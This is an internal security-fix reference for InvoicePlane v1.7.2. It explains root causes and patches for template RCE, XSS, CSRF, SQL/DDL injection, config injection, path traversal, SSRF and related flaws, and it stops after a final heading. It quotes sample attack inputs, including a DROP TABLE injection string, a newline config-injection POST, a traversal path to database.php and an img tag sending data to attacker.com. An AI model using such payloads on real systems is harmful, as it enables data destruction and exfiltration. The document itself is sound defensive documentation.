# InvoicePlane v1.7.2 — Security Improvements

This document explains every security problem found in the v1.7.2 release cycle, what the
root cause was, and exactly what was changed to fix it. It is intended as an internal
reference for developers and security reviewers.

---

## Table of Contents

1. [Critical — Remote Code Execution (RCE) via Template System](#1-critical--remote-code-execution-rce-via-template-system)
2. [High — Stored Cross-Site Scripting (XSS)](#2-high--stored-cross-site-scripting-xss)
3. [High — IDOR + CSRF in Guest Quote Approve/Reject](#3-high--idor--csrf-in-guest-quote-approvereject)
4. [High — Weak PRNG in Password Reset Tokens](#4-high--weak-prng-in-password-reset-tokens)
5. [High — SQL / DDL Injection in Tax Rate Decimal Places](#5-high--sql--ddl-injection-in-tax-rate-decimal-places)
6. [High — Configuration Injection in Database Setup](#6-high--configuration-injection-in-database-setup)
7. [High — Arbitrary File Deletion via Path Traversal](#7-high--arbitrary-file-deletion-via-path-traversal)
8. [Medium — Authorization Bypass in Guest Invoice / Payment Endpoints](#8-medium--authorization-bypass-in-guest-invoice--payment-endpoints)
9. [Medium — Setup Wizard Accessible Post-Installation](#9-medium--setup-wizard-accessible-post-installation)
10. [Medium — SSRF via PDF Footer Content](#10-medium--ssrf-via-pdf-footer-content)
11. [Medium — File Path Traversal across Codebase](#11-medium--file-path-traversal-across-codebase)
12. [Medium — Payment Gateway API Credential Exposure](#12-medium--payment-gateway-api-credential-exposure)
13. [Medium — Open Redirect via Unvalidated `HTTP_REFERER`](#13-medium--open-redirect-via-unvalidated-http_referer)
14. [Low–Medium — PHPMailer Debug Output Leaking into AJAX Responses](#14-lowmedium--phpmailer-debug-output-leaking-into-ajax-responses)
15. [Low–Medium — Duplicate Payment Processing in Stripe / PayPal Callbacks](#15-lowmedium--duplicate-payment-processing-in-stripe--paypal-callbacks)
16. [Low–Medium — Email Template Preview Rendered as Raw HTML](#16-lowmedium--email-template-preview-rendered-as-raw-html)
17. [Low — EXIF Metadata in Uploaded Images](#17-low--exif-metadata-in-uploaded-images)
18. [Low — Password Reset Tokens with No Expiry](#18-low--password-reset-tokens-with-no-expiry)
19. [Review Follow-up — PR #1536 Hardening Pass](#19-review-follow-up--pr-1536-hardening-pass)
20. [New Cross-Cutting Security Infrastructure](#20-new-cross-cutting-security-infrastructure)

---

## 1. Critical — Remote Code Execution (RCE) via Template System

**PRs:** [#1505](https://github.com/InvoicePlane/InvoicePlane/pull/1505),
[#1506](https://github.com/InvoicePlane/InvoicePlane/pull/1506)  
**CVSS:** 9.9 Critical  
**Advisory:** `.github/security/SECURITY_ADVISORY_RCE_FIX.md`

### What Was Wrong

The v1.7.1 LFI fix had a critical bypass. The `validate_template_name()` function in
`application/helpers/template_helper.php` existed in the codebase but its body was empty —
only the docblock and closing brace were present. The function therefore returned nothing
useful, so template names from the database were included without validation.

More importantly, the `get_invoice_templates()` and `get_quote_templates()` methods in
`application/modules/invoices/models/Mdl_templates.php` built the template "whitelist" by
scanning the filesystem at runtime using CodeIgniter's `directory_map()`:

```php
// Vulnerable: whitelist built from whatever is on disk
public function get_invoice_templates($type = 'pdf')
{
    $this->load->helper('directory');
    $templates = directory_map(APPPATH . '/views/invoice_templates/pdf', true);
    return $this->remove_extension($templates);
}
```

Because the template directories were writable by the web server process, an authenticated
admin could:

1. Write a PHP webshell (`evil.php`) into `application/views/invoice_templates/public/`.
2. On the next request, `directory_map()` found `evil.php` and it was automatically added to
   the "allowed" whitelist.
3. The admin set `public_invoice_template = evil` in Settings.
4. Any unauthenticated visitor accessing a public invoice URL now triggered the webshell,
   executing arbitrary PHP with web-server privileges.

Additionally, the same PR uncovered five instances of unvalidated `$_SERVER['HTTP_REFERER']`
redirects that allowed open-redirect / phishing attacks (CWE-601, CVSS 6.1).

### What Was Improved

**Static whitelist in `Mdl_templates.php`**  
The filesystem scan was replaced with a hardcoded PHP constant. No matter what files exist
on disk, only the names in the constant can ever be loaded:

```php
private const ALLOWED_INVOICE_TEMPLATES = [
    'pdf'    => ['InvoicePlane', 'InvoicePlane - paid', 'InvoicePlane - overdue'],
    'public' => ['InvoicePlane_Web'],
];
private const ALLOWED_QUOTE_TEMPLATES = [
    'pdf'    => ['InvoicePlane'],
    'public' => ['InvoicePlane_Web'],
];

public function get_invoice_templates($type = 'pdf')
{
    return $type === 'pdf'
        ? self::ALLOWED_INVOICE_TEMPLATES['pdf']
        : ($type === 'public' ? self::ALLOWED_INVOICE_TEMPLATES['public'] : []);
}
```

**`validate_template_name()` implemented in `template_helper.php`**  
The previously empty function was completed with seven independent validation layers:

1. Reject empty or non-string input.
2. Detect path traversal via `validate_safe_filename()`.
3. Validate `$type` is `invoice` or `quote` (strict allowlist).
4. Validate `$scope` is `pdf` or `public` (strict allowlist).
5. Static whitelist check — the primary defence.
6. Character validation (alphanumeric, spaces, hyphens, underscores only).
7. Log all failures with sanitized values to prevent log injection.

**Centralised validation helper in `View.php`**  
A new `get_validated_template_path()` helper was added to `application/modules/guest/controllers/View.php`.
It runs validation + path construction + file existence check in one call and falls back to
the default template if anything fails, preventing arbitrary file inclusion even if all other
layers were somehow bypassed.

**Open-redirect fixes (`security_helper.php`)**  
A new `application/helpers/security_helper.php` was created with `get_safe_referer()`,
which rejects any redirect target that is not an internal URL before redirecting. All five
vulnerable redirect sites were updated to use this helper.

**`security_helper.php` correction (PR #1506)**  
A CodeRabbit auto-fix corrected a minor issue in `security_helper.php` introduced by #1505.

**Adding custom templates post-fix**  
Custom templates now require two explicit steps: create the file AND add the name to
`CUSTOM_INVOICE_TEMPLATES_PDF` (or equivalent) in `ipconfig.php`. The filesystem is never
scanned. See `AGENTS.md` for instructions.

---

## 2. High — Stored Cross-Site Scripting (XSS)

**PRs:** [#1500](https://github.com/InvoicePlane/InvoicePlane/pull/1500),
[#1516](https://github.com/InvoicePlane/InvoicePlane/pull/1516)  
**CVSS:** 8.0 High

### What Was Wrong

A comprehensive audit of all 147 view files found 32 locations where database values or
`get_setting()` results were echoed directly into HTML `value` attributes and other contexts
without output encoding. An attacker who could control any of these settings (e.g., through
a compromised admin account or a malicious API response) could inject `"><script>` payloads
that would execute in every administrator's browser session.

Affected modules: Settings (7 files, 21 fixes), Invoice modals (3 files, 6 fixes), Quote
modals (3 files, 4 fixes), and Projects form (1 file, 1 fix).

Notable targets included: Stripe/PayPal API key fields, SMTP port, cron authentication key,
QR code recipient/IBAN/BIC, password fields in copy-invoice and quote modals.

### What Was Improved

All vulnerable fields were wrapped with `htmlspecialchars($value, ENT_QUOTES | ENT_IGNORE)`
or the project's existing `htmlsc()` wrapper (which uses the same flags):

```php
// Before — raw echo into HTML attribute
value="<?= get_setting('gateway_stripe_apiKey') ?>"

// After — HTML-encoded
value="<?= get_setting('gateway_stripe_apiKey', '', true) ?>"
// The third 'true' argument triggers html_escape() inside get_setting()
```

The same pattern was applied to modal form fields that pre-fill from database objects:

```php
// Before
value="<?= $invoice->invoice_password ?>"

// After
value="<?= htmlsc($invoice->invoice_password) ?>"
```

---

## 3. High — IDOR + CSRF in Guest Quote Approve/Reject

**PRs:** [#1471](https://github.com/InvoicePlane/InvoicePlane/pull/1471),
[#1482](https://github.com/InvoicePlane/InvoicePlane/pull/1482),
[#1487](https://github.com/InvoicePlane/InvoicePlane/pull/1487)  
**CVSS:** 7.5 High

### What Was Wrong

The `approve()` and `reject()` methods in `application/modules/guest/controllers/View.php`
were accessible via GET request and performed no ownership check. Any authenticated guest
user could approve or reject quotes belonging to other clients simply by knowing or guessing
a `quote_url_key`. Because the endpoints accepted GET, a single malicious link (e.g., in an
email) would trigger the action without user consent (CSRF).

There was also a SQL injection risk in `application/modules/guest/controllers/Payments.php`
where `invoice_id` from a URL parameter was concatenated directly into a query string.

### What Was Improved

**Endpoint hardening (applied in multiple passes across #1471, #1482, #1487)**

*Method enforcement:* Both `approve()` and `reject()` now return 404 for non-POST requests,
blocking simple CSRF via GET links.

*CSRF token validation:* Hidden CSRF token fields (`_csrf_field()`) were added to the
approve/reject forms. CodeIgniter's built-in CSRF protection validates the token on every
POST.

*Client-scope ownership check:* Every quote operation now runs a `where_in()` filter against
the guest's assigned client list:

```php
$quote = $this->mdl_quotes
    ->is_open()                                          // status 2 or 3 only
    ->where('ip_quotes.quote_url_key', $quote_url_key)
    ->where_in('ip_quotes.client_id', $this->user_clients) // ownership check
    ->get()->row();

if ($quote === null) { show_404(); }
```

*Duplicate email prevention:* Emails are only sent when `$this->db->affected_rows() > 0`,
preventing duplicate notifications if the row was already updated by a concurrent request.

*HTML escaping in form attributes:* All dynamic values in form `action` URLs and CSRF token
outputs were wrapped in `htmlsc()` to prevent XSS in form attributes.

*CSRF token regeneration in PayPal flow:* CodeIgniter regenerates the CSRF token after every
POST. The two-step PayPal flow (createOrder → capturePayment) required the server to return
the new token in the `createOrder` JSON response, and the client JavaScript to track and
resend it with `capturePayment`. This was implemented in the PayPal gateway controller and
JavaScript.

*SQL injection fix:* The `invoice_id` URL parameter in `Payments.php` was cast to `(int)`
before use and proper parameter binding was added.

---

## 4. High — Weak PRNG in Password Reset Tokens

**PR:** [#1494](https://github.com/InvoicePlane/InvoicePlane/pull/1494)  
**CVSS:** 7.5 High  
**Related:** CVE-2021-29023

### What Was Wrong

Password reset tokens were generated as:

```php
$token = md5(time() . $email . sha1(mt_rand()));
```

This produces approximately 31 bits of effective entropy because `mt_rand()` is seeded from
the Unix timestamp and `time()` is predictable. On a GPU the entire 32-character space can
be brute-forced in under a second for a known email address and approximate token-generation
time. An attacker who knew a target's email and the rough time of the reset request could
enumerate all possible tokens.

Additionally, the `Cryptor::salt()` method used `substr(sha1(mt_rand()), 0, 22)`, which has
the same weakness.

### What Was Improved

A new helper file `application/helpers/ip_security_helper.php` was created (named `ip_security`
to avoid shadowing CodeIgniter's built-in `security` helper):

```php
function generate_password_reset_token(): string
{
    return bin2hex(random_bytes(32)); // 256-bit cryptographic entropy → 64-char hex token
}

function generate_secure_salt(): string
{
    // random_bytes → base64 → crypt-compatible alphabet (translate + to ., strip =)
    $raw    = random_bytes(16);
    $base64 = base64_encode($raw);
    return substr(strtr($base64, '+', '.'), 0, 22);
}
```

The `Cryptor::salt()` method was updated to delegate to `generate_secure_salt()`.

The token generation in `Mdl_users` was updated:

```php
// Before
$token = md5(time() . $email . $this->crypt->salt());

// After
$this->load->helper('ip_security');
$token = generate_password_reset_token();
```

The existing `VARCHAR(100)` column comfortably holds the new 64-character hex token, so no
database migration was required.

---

## 5. High — SQL / DDL Injection in Tax Rate Decimal Places

**PRs:** [#1481](https://github.com/InvoicePlane/InvoicePlane/pull/1481),
[#1488](https://github.com/InvoicePlane/InvoicePlane/pull/1488)  
**CVSS:** 7.2 High  
**Linked Issue:** [#1479](https://github.com/InvoicePlane/InvoicePlane/issues/1479)

### What Was Wrong

The Settings controller executed a schema-altering DDL statement that incorporated the raw
POST parameter `tax_rate_decimal_places` without any sanitization:

```php
$this->db->query("
    ALTER TABLE `ip_tax_rates` CHANGE `tax_rate_percent` `tax_rate_percent`
    DECIMAL( 5, {$settings['tax_rate_decimal_places']} ) NOT null");
```

An authenticated admin could submit `tax_rate_decimal_places=0) NOT NULL; DROP TABLE ip_tax_rates; --`
and corrupt or destroy the database schema. PR #1481 applied an initial `(int)` cast with a
range check; PR #1488 strengthened this further with a reusable processor class, a DB
transaction, and unit tests.

### What Was Improved

**Initial fix (PR #1481):** Cast the parameter to `int` immediately on receipt and validate
the range (2–3):

```php
$decimal_places = (int) $settings['tax_rate_decimal_places'];
if ($decimal_places < 2 || $decimal_places > 3) {
    $this->session->set_flashdata('alert_error', trans('invalid_tax_rate_decimal_places'));
    redirect('settings');
}
```

**Hardened fix (PR #1488):** Added `TaxRateDecimalPlacesProcessor` to encapsulate the
validation and change-detection logic; the actual DDL is only executed if the value changed;
the ALTER TABLE and the settings save are wrapped in a DB transaction to keep the schema and
the stored setting in sync:

```php
$ddl = sprintf(
    'ALTER TABLE `ip_tax_rates` CHANGE `tax_rate_percent` `tax_rate_percent` DECIMAL(5, %d) NOT NULL',
    $decimal_places  // integer, validated — no injection possible
);
$this->db->trans_begin();
$this->db->query($ddl);
$this->mdl_settings->save('tax_rate_decimal_places', (string) $decimal_places);
$this->db->trans_commit();
```

Unit tests cover acceptance of valid values (2 and 3), rejection of anything outside that
range, and the change-detection logic.

---

## 6. High — Configuration Injection in Database Setup

**PR:** [#1513](https://github.com/InvoicePlane/InvoicePlane/pull/1513)  
**CVSS:** 7.2 High

### What Was Wrong

The Setup wizard wrote database configuration directly from POST parameters into
`ipconfig.php` without stripping newlines or other control characters. An attacker who could
reach the setup endpoint could inject additional configuration directives:

```
POST db_hostname=localhost%0AENABLE_DEBUG%3Dtrue%0ADB_HOSTNAME%3D
```

This would produce a config file entry like:

```
DB_HOSTNAME=localhost
ENABLE_DEBUG=true
DB_HOSTNAME=
```

Debug mode, alternate database servers, or other dangerous settings could be force-enabled
this way.

### What Was Improved

Two new helper functions were added to `application/helpers/file_security_helper.php`:

```php
function validate_db_config_parameter(string $value, string $type): array
{
    // Reject newlines and null bytes immediately
    if (preg_match('/[\r\n\0]/', $value)) {
        return ['valid' => false, 'error' => 'control_character'];
    }

    $patterns = [
        'hostname' => '/^[a-zA-Z0-9.\-_:\[\]]+$/',
        'username' => '/^[a-zA-Z0-9.\-_@]+$/',
        'database' => '/^[a-zA-Z0-9_\-]+$/',
        'port'     => null, // handled as integer 1–65535
    ];
    // ... type-specific validation
}

function sanitize_db_config_value(string $value): string
{
    // Escape single quotes for defense-in-depth when writing to .php config file
    return str_replace("'", "\\'", $value);
}
```

The Setup controller now validates all five parameters (`hostname`, `username`, `password`,
`database`, `port`) before writing the config file. If any parameter fails validation the
user sees an error and the file is never written.

---

## 7. High — Arbitrary File Deletion via Path Traversal

**PRs:** [#1512](https://github.com/InvoicePlane/InvoicePlane/pull/1512),
[#1510](https://github.com/InvoicePlane/InvoicePlane/pull/1510),
[#1529](https://github.com/InvoicePlane/InvoicePlane/pull/1529)  
**CVSS:** 7.1 High  
**Advisory:** `.github/security/SECURITY_ADVISORY_ARBITRARY_FILE_DELETION.md`

### What Was Wrong

The `remove_logo()` method in `application/modules/settings/controllers/Settings.php`
retrieved the logo filename from the database and passed it directly to `unlink()`:

```php
public function remove_logo($type)
{
    $logo_filename = get_setting($type . '_logo');
    $logo_path     = './uploads/' . $logo_filename;
    if (file_exists($logo_path)) {
        unlink($logo_path);  // no validation — deletes whatever $logo_filename points to
    }
}
```

Because the settings save function also had no validation, an admin could store a path like
`../../application/config/database.php` in `invoice_logo` and then trigger `remove_logo` to
delete that file, taking down the entire application.

### What Was Improved

**Input validation at save time (PR #1512)**  
When saving settings, every logo filename value is now validated with `validate_safe_filename()`
before it reaches the database. Path traversal sequences (`../`, `..\`), absolute paths
(`/etc/`), Windows drive letters (`C:`), and null bytes are all rejected:

```php
if ($key === 'invoice_logo' || $key === 'login_logo') {
    if (!empty($value)) {
        $validation = validate_safe_filename($value);
        if (!$validation['valid']) {
            log_message('error', sprintf(
                'Path traversal blocked in %s (hash: %s)',
                sanitize_for_logging($key),
                $validation['hash']
            ));
            $this->session->set_flashdata('alert_error', trans('invalid_filename'));
            redirect('settings');
        }
    }
}
```

**Type-parameter whitelisting**  
The `$type` parameter to `remove_logo()` is now checked against `['invoice', 'login']`.
Any other value results in a logged error and a redirect.

**Directory-confinement validation at deletion time (PR #1512)**  
`validate_file_access()` is called before any file operation. It resolves the real path and
checks that the result is within `./uploads/`. Even if the database was poisoned with a path
that passed the save-time validation, the deletion is blocked:

```php
$validation = validate_file_access($logo_filename, './uploads/');
if (!$validation['valid']) { /* log and redirect, no deletion */ }
if (file_exists($validation['path'])) {
    $deleted = unlink($validation['path']);
}
```

**Codebase-wide path traversal fix (PR #1510)**  
The same class of vulnerability was also present in `Mdl_uploads` (three methods) and the
guest `View` controller (attachment download). A new `validate_db_filename()` helper was
introduced to provide a single, shared validation function for any path constructed from a
database value. It strips directory components with `basename()`, checks for traversal
sequences, and validates the resolved path with `realpath()` + `validate_file_in_directory()`
to catch symlink escapes.

**CVE documentation (PR #1529)**  
`.github/security/SECURITY_ADVISORY_ARBITRARY_FILE_DELETION.md`, `.github/security/CVE_REQUEST_SUMMARY.md`, and
`.github/security/verify_file_deletion_fix.php` were added to document the vulnerability for CVE allocation
and provide operators with a verification script.

---

## 8. Medium — Authorization Bypass in Guest Invoice / Payment Endpoints

**PRs:** [#1517](https://github.com/InvoicePlane/InvoicePlane/pull/1517),
[#1537](https://github.com/InvoicePlane/InvoicePlane/pull/1537)  
**CVSS:** 6.5 Medium

### What Was Wrong

The guest invoice `view()` method in `application/modules/guest/controllers/Invoices.php`
looked up invoices by `invoice_id` + client ownership but did not apply the `guest_visible()`
scope. This meant that draft invoices (status 1) were accessible to guest users, exposing
`invoice_url_key` handles that could be passed to payment and attachment endpoints.

The same problem existed in all five payment gateway methods across the Stripe and PayPal
controllers: they looked up invoices by `invoice_url_key` without applying `guest_visible()`,
so draft invoice payments could be initiated or captured.

### What Was Improved

A single-line addition of `->guest_visible()` was applied to every affected query:

```php
// Before — draft invoices accessible
$invoice = $this->mdl_invoices
    ->where('ip_invoices.invoice_id', $invoice_id)
    ->where_in('ip_invoices.client_id', $this->user_clients)
    ->get()->row();

// After — only sent (2), viewed (3), paid (4)
$invoice = $this->mdl_invoices
    ->guest_visible()
    ->where('ip_invoices.invoice_id', $invoice_id)
    ->where_in('ip_invoices.client_id', $this->user_clients)
    ->get()->row();
```

Null checks and explicit `show_404()` calls were also added after each retrieval, and
security-logging statements were added for unauthorized access attempts.

---

## 9. Medium — Setup Wizard Accessible Post-Installation

**PRs:** [#1491](https://github.com/InvoicePlane/InvoicePlane/pull/1491),
[#1511](https://github.com/InvoicePlane/InvoicePlane/pull/1511),
[#1518](https://github.com/InvoicePlane/InvoicePlane/pull/1518)  
**CVSS:** 6.5 / 6.1 Medium

### What Was Wrong

After a successful installation, `SETUP_COMPLETED=true` was written to `ipconfig.php`, but
the setup controller never read this flag. Any unauthenticated user could navigate to
`/index.php/setup/` and overwrite the database configuration, causing an immediate denial-
of-service or potentially redirecting the application to an attacker-controlled database.

Additionally, database configuration parameters submitted through the setup form were not
sanitized, creating newline-injection opportunities (see §6 above).

### What Was Improved

**Early 403 guard (PR #1511)**  
The `Setup` controller constructor now checks `SETUP_COMPLETED` before loading any models
or processing any input. If `true`, it immediately calls `show_error(..., 403)`:

```php
public function __construct()
{
    parent::__construct();
    if (env_bool('SETUP_COMPLETED', false)) {
        show_error('Setup already completed. Set SETUP_COMPLETED=false to re-run.', 403);
    }
}
```

**Database write lock (PR #1491)**  
The `configure_database()` method was hardened so that even if the early guard is bypassed,
the config file is only written after a successful connection test and only when
`SETUP_COMPLETED` is `false`. Input sanitization helpers (`sanitize_database_config_value`,
`sanitize_database_port`) were added to `file_security_helper.php`.

**Automatic post-install lockdown (PR #1518)**  
`post_setup_tasks()` now sets both `SETUP_COMPLETED=true` and `DISABLE_SETUP=true`
automatically. Robust regex patterns handle whitespace variations, return values from
`preg_replace()` are validated (null = failure), and file-write errors are caught and logged
with `error_get_last()`. If the file write fails (e.g., read-only deployment), an admin
warning banner is displayed on next login.

---

## 10. Medium — SSRF via PDF Footer Content

**PR:** [#1492](https://github.com/InvoicePlane/InvoicePlane/pull/1492)  
**CVSS:** 6.5 Medium

### What Was Wrong

The PDF invoice and quote footer accepted raw HTML that mPDF rendered faithfully. An admin
could save a footer like `<img src="https://attacker.com/track.php?d=secret">` and the PDF
renderer would make an outbound HTTP request to the attacker's server during PDF generation,
potentially leaking internal network topology, server IP, or triggering SSRF attacks against
internal services.

### What Was Improved

A new `sanitize_pdf_footer_content()` function was added to a helper. It strips all tags
except a safe subset (`b`, `strong`, `i`, `em`, `u`, `p`, `br`, `span`, `small`, `div`)
using `strip_tags()` with an allowlist, and removes any attribute that could reference an
external resource (`src`, `href`, `action`, `background`, `style`, etc.).

```php
$invoiceFooter = sanitize_pdf_footer_content(
    $CI->mdl_settings->settings['pdf_invoice_footer'] ?? ''
);
$mpdf->DefHTMLFooterByName('footer', '<div>' . $invoiceFooter . '</div>');
```

The Settings view help-text was also updated to inform admins which tags are allowed and
that external resources are stripped.

---

## 11. Medium — File Path Traversal across Codebase

**PR:** [#1510](https://github.com/InvoicePlane/InvoicePlane/pull/1510)  
**CVSS:** 6.5 Medium

### What Was Wrong

Beyond the logo-file deletion (§7), the same class of path traversal existed in three
methods of `Mdl_uploads` and in the guest attachment download handler (`View.php`). Each
method constructed a filesystem path by concatenating `./uploads/` with a `file_name_new`
column value from the database. While the upload controller validated new uploads, there was
no defence-in-depth if the database was compromised or the value was otherwise manipulated.

Additionally, `file_name_original` in the guest attachment view was echoed without HTML
encoding, creating a stored XSS vector.

### What Was Improved

A `validate_db_filename()` function was added to `file_security_helper.php`. It:

1. Validates no path traversal sequences are present.
2. Applies `basename()` to strip any directory component.
3. Constructs the candidate path.
4. Calls `realpath()` and `validate_file_in_directory()` to catch symlink escapes — a
   symlink inside `./uploads/` could otherwise point outside the directory.

All four affected call sites were updated to use this helper. Failures are skipped
gracefully (logging with a sanitized hash) rather than crashing. `file_name_original` is
now wrapped in `html_escape()` in the view.

---

## 12. Medium — Payment Gateway API Credential Exposure

**PR:** [#1515](https://github.com/InvoicePlane/InvoicePlane/pull/1515)  
**CVSS:** 6.5 Medium

### What Was Wrong

The payment gateway settings partial view (`partial_settings_online_payment.php`) decrypted
Stripe API keys and PayPal client secrets server-side and embedded the plaintext values in
HTML `value` attributes:

```php
value="<?= $this->crypt->decode(get_setting('gateway_stripe_apiKey')) ?>"
```

Although the fields had `type="password"` so the browser masked the display, the cleartext
secrets were visible in the HTML source and in browser DevTools. Any user who could open
DevTools, or any XSS vector in the page, could extract the live production API credentials.

### What Was Improved

The field values were changed to empty strings. The controller already had logic to preserve
the existing encrypted value when a field is submitted empty:

```php
// Before
value="<?= $this->crypt->decode(get_setting('gateway_stripe_apiKey')) ?>"

// After
value="" autocomplete="new-password"
```

The `autocomplete="new-password"` attribute also prevents browser autofill from leaking
stored credentials. This mirrors the existing pattern already used for the SMTP password
field in `partial_settings_email.php`.

---

## 13. Medium — Open Redirect via Unvalidated `HTTP_REFERER`

**PR:** [#1505](https://github.com/InvoicePlane/InvoicePlane/pull/1505)  
**CVSS:** 6.1 Medium

### What Was Wrong

Five locations in the codebase used `$_SERVER['HTTP_REFERER']` directly as a redirect target:

- `application/modules/payments/views/modal_add_payment.php` — post-payment redirect
- `application/modules/custom_fields/controllers/Custom_fields.php` — after field deletion
- `application/modules/filter/controllers/Ajax.php` — three AJAX filter operations

An attacker could craft a link to the application that set the `Referer` header to an
external phishing domain. Clicking the payment "Done" button would then redirect the user to
the attacker's site.

### What Was Improved

`application/helpers/security_helper.php` was created with a `get_safe_referer()` function.
It parses the `Referer` header and compares the scheme, host, and port against the current
application's base URL. If they do not match, it falls back to the application home page:

```php
function get_safe_referer(): string
{
    $referer  = $_SERVER['HTTP_REFERER'] ?? '';
    $base_url = base_url();

    $referer_parts  = parse_url($referer);
    $base_url_parts = parse_url($base_url);

    if (($referer_parts['host']   ?? '') !== ($base_url_parts['host']   ?? '') ||
        ($referer_parts['scheme'] ?? '') !== ($base_url_parts['scheme'] ?? '')) {
        return $base_url;
    }
    return $referer;
}
```

All five vulnerable redirect sites were updated to use `redirect(get_safe_referer())`.

---

## 14. Low–Medium — PHPMailer Debug Output Leaking into AJAX Responses

**PR:** [#1495](https://github.com/InvoicePlane/InvoicePlane/pull/1495)  
**CVSS:** 5.3

### What Was Wrong

When `ENABLE_DEBUG=true`, PHPMailer's `Debugoutput` was set to `'echo'`, which printed SMTP
session transcripts directly to stdout. Because email sending is invoked during AJAX
responses, this debug output was prepended to the JSON response, breaking JSON parsing and
causing the fullpage-loader to hang indefinitely without any user-visible error.

The non-debug mode used `'error_log'` which routed through PHP's error log rather than
CodeIgniter's logging system, making it invisible in the application log viewer.

In both modes, raw SMTP session data (which includes email addresses, authentication
challenges, and message content previews) could end up in logs or HTTP responses without
sanitization, creating a log-injection risk.

### What Was Improved

A custom callback function was registered as PHPMailer's debug handler:

```php
function phpmailer_debug_output(string $str, int $level = 0): void
{
    $sanitized = sanitize_for_logging($str);
    log_message('debug', 'PHPMailer [lvl ' . $level . ']: ' . $sanitized);
}

$mail->Debugoutput = 'phpmailer_debug_output';
```

This applies regardless of `ENABLE_DEBUG`: all SMTP output now goes through
`sanitize_for_logging()` (stripping newlines, control chars) and into the CodeIgniter log
file — never to stdout. AJAX responses remain clean JSON. A custom error-state SVG and
Bootstrap alert were added to give users visible feedback when email sending fails.

---

## 15. Low–Medium — Duplicate Payment Processing in Stripe / PayPal Callbacks

**PR:** [#1496](https://github.com/InvoicePlane/InvoicePlane/pull/1496)  
**CVSS:** 5.3

### What Was Wrong

Stripe and PayPal can (and do) fire their webhook callbacks more than once for the same
transaction. Because there was no deduplication mechanism, each callback would insert a new
payment record, resulting in invoices with a negative balance (payments totalling more than
the invoice amount).

### What Was Improved

A `payment_external_id VARCHAR(255)` column was added to `ip_payments` with a unique
database index (`idx_payment_external_id`). Before saving any payment, the callback handler
now queries for an existing record with the same Stripe `payment_intent` or PayPal
`capture_id`:

```php
$existing = $this->db
    ->where('payment_external_id', $payment_intent)
    ->get('ip_payments')->row();

if ($existing) {
    log_message('warning', 'Duplicate payment blocked: ' . sanitize_for_logging($payment_intent));
    return;
}

if ($invoice->invoice_balance <= 0) {
    return; // already fully paid
}
```

The application-level check provides defence-in-depth; the unique database index enforces
the constraint even under race conditions. The `payment_intent` / `capture_id` values are
also validated for format and length before use.

---

## 16. Low–Medium — Email Template Preview Rendered as Raw HTML

**PR:** [#1486](https://github.com/InvoicePlane/InvoicePlane/pull/1486)  
**CVSS:** 5.4

### What Was Wrong

The email template preview endpoint returned raw HTML content from the database and rendered
it directly in the browser. Because email templates can contain user-defined content, an
admin who had previously stored a malicious template could trigger XSS against any user who
opened the preview. The Grunt build configuration also had the incorrect `outputStyle`
setting (`"extended"` instead of `"expanded"`), causing SCSS compilation failures.

### What Was Improved

The preview endpoint was updated to pass template content through a sanitisation function
before returning it. The HTML is now rendered in a sandboxed context. The Grunt `outputStyle`
typo was corrected to `"expanded"`.

---

## 17. Low — EXIF Metadata in Uploaded Images

**PR:** [#1507](https://github.com/InvoicePlane/InvoicePlane/pull/1507)  
**CVSS:** 4.3

### What Was Wrong

Images uploaded by users (client attachments, logos) retained their full EXIF metadata. EXIF
data can include GPS coordinates, camera serial numbers, device identifiers, and creation
timestamps. When these files are served to other users (e.g., guest invoice attachments),
the metadata is visible to anyone who downloads the image.

### What Was Improved

A `strip_exif_metadata()` helper function was added to `file_security_helper.php`. It uses
PHP's GD extension to re-encode the image (JPEG, PNG, GIF, WebP), which discards EXIF data:

```php
function strip_exif_metadata(string $filePath): array
{
    if (!env_bool('SEC_STRIP_EXIF_FROM_IMAGES', false)) {
        return ['success' => true, 'skipped' => true];  // disabled by default
    }
    // load → re-save → destroys metadata
    $image = imagecreatefromjpeg($filePath);
    imagejpeg($image, $filePath, 90);
    imagedestroy($image);
    return ['success' => true];
}
```

The feature is **disabled by default** and must be explicitly enabled in `ipconfig.php` with
`SEC_STRIP_EXIF_FROM_IMAGES=true`. It was integrated into both the Upload controller and the
Settings controller (for logo uploads). Failures are logged but do not block the upload.

---

## 18. Low — Password Reset Tokens with No Expiry

**PR:** [#1514](https://github.com/InvoicePlane/InvoicePlane/pull/1514)  
**CVSS:** 4.3

### What Was Wrong

Password reset tokens were valid indefinitely. A token generated months before but never
used remained valid. If a reset email was intercepted, leaked in a log file, or obtained
through another vector, an attacker could use it at any time to take over the account.

### What Was Improved

A `user_passwordreset_token_expiry DATETIME` column was added to `ip_users` (migration
`044_1.7.3.sql`). Tokens now expire after a configurable duration (default: 15 minutes).

```php
// Token validation now checks expiry
if (!empty($user->user_passwordreset_token_expiry)) {
    $expiry  = new DateTime($user->user_passwordreset_token_expiry, self::$utc_timezone);
    $now     = new DateTime('now',                                  self::$utc_timezone);
    if ($now > $expiry) {
        $this->_clear_password_reset_token($user->user_id);
        // redirect with "token expired" message
    }
}
```

Configuration: `PASSWORD_RESET_TOKEN_EXPIRY_MINUTES` in `ipconfig.php` (default: 15,
maximum enforced: 1440 minutes / 24 hours). Existing tokens without an expiry (NULL) continue
working during the migration window for backward compatibility.

---

## 19. Review Follow-up — PR #1536 Hardening Pass

**PR:** [#1536](https://github.com/InvoicePlane/InvoicePlane/pull/1536)

This PR addressed issues raised during code review of the earlier security PRs. Key changes:

**`entrypoint.sh` config-injection guard**  
A `sanitize_config_value()` shell function was added that hard-fails on `\n` or `\r` in any
environment variable before it is written into `ipconfig.php`. This prevents Docker
deployments from being configured with injected newlines via environment variables.

**`XSS_Protection_Trait` fix**  
The `file_security` helper was moved to load at the top of `filter_input()` (unconditionally),
not inside the `if ($xss_detected)` block. Previously, `sanitize_for_logging()` was
unavailable when XSS detection ran but the block was not entered.

**`Admin_Controller` duplicate removal**  
A `sanitize_array()` override in `Admin_Controller` was removed. It shadowed the trait's
sanitized version and logged raw field paths, creating a log-injection risk.

**`invoice_helper` logo URL escaping**  
The logo URL was wrapped in `html_escape()` before being emitted into an `<img src="..."`
attribute.

**`Mdl_templates` custom-template allowlisting**  
The `_merge_custom()` method still used `directory_map()` for custom templates, recreating
the RCE risk for custom installations. This was replaced with an explicit allowlist driven by
four new `ipconfig.php` constants:

```
CUSTOM_INVOICE_TEMPLATES_PDF=MyTemplate,AnotherTemplate
CUSTOM_INVOICE_TEMPLATES_PUBLIC=
CUSTOM_QUOTE_TEMPLATES_PDF=
CUSTOM_QUOTE_TEMPLATES_PUBLIC=
```

The filesystem is never scanned for custom templates either.

**`Mdl_reports` integer cast fix**  
